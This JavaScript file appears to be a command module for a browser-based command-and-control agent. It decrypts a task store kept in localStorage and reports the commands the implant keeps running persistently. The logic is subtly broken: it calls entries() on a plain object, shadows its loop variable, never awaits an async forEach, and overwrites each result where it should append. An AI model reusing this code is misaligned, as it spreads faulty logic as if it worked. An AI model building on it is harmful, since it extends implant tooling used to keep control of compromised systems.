async function list_inline_js_persistent(task, command, params){
    try{
        result = "";
        dec_runner = await decrypt_runner(localStorage.getItem('runner'));
        dict_runner = JSON.parse(dec_runner)
        if (dict_runner === null){
            return {"user_output": "No running tasks", "completed": true};
        }
        Object.keys(dict_runner).forEach(async function(entry) {
            for (const entry of dict_runner.entries()) {
                command = dict_runner[entry][1];
                task_id = dict_runner[entry][0]["id"];
                parameters = dict_runner[entry][0]["parameters"];
                result = "Command: "+command+"\n"+"Task ID: "+task_id+"\n"+"Parameters: "+parameters+"\n"
            }
        });
        if (result == ""){
            return {"user_output": "No running tasks", "completed": true};
        }
        return {"user_output": result.toString(), "completed": true};
    }
    catch(error){
        return {"user_output": error.toString(), "status": "error", "completed": true};
    }
};

exports.list_inline_js_persistent = list_inline_js_persistent